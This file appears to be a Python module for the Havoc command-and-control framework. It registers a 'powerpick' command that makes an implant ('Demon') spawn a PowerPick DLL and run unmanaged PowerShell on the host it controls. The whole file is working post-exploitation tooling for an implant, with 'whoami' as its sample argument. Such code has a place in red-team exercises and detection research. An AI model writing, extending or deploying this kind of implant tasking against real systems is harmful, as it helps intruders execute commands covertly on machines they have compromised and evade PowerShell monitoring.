
from havoc import Demon, RegisterCommand
from struct import pack, calcsize

class Packer:
    def __init__(self):
        self.buffer : bytes = b''
        self.size   : int   = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)

def PowerPick(demonID, *param):
    TaskID   : str    = None
    demon    : Demon  = None
    packer   = Packer()

    demon  = Demon( demonID )

    if len( param ) < 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough arguments" )
        return

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to execute unmanaged powershell commands" )

    packer.addstr( " " + ''.join( param ) )
    demon.DllSpawn( TaskID, ":/binaries/PowerPick.x64.dll", packer.getbuffer() )

    return TaskID

RegisterCommand( PowerPick, "", "powerpick", "executes unmanaged powershell commands", 0, "[args]", "whoami" )
